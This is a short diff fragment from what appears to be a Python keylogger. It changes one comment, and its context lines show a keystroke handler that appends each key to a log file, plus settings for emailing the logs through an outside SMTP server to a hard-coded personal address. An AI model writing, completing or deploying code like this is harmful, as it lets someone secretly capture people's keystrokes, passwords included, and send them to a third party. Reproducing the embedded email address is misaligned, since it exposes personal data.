@@ -13,7 +13,7 @@ RECIPIENT_EMAIL = "piyushy1@gmail.com"  # Replace with recipient email
 SMTP_SERVER = "smtp.zoho.eu"
 SMTP_PORT = 587
 
-# Log keystrokes to file
+# Log keystrokes to files
 def on_press(key):
     try:
         with open(LOG_FILE, "a") as f:
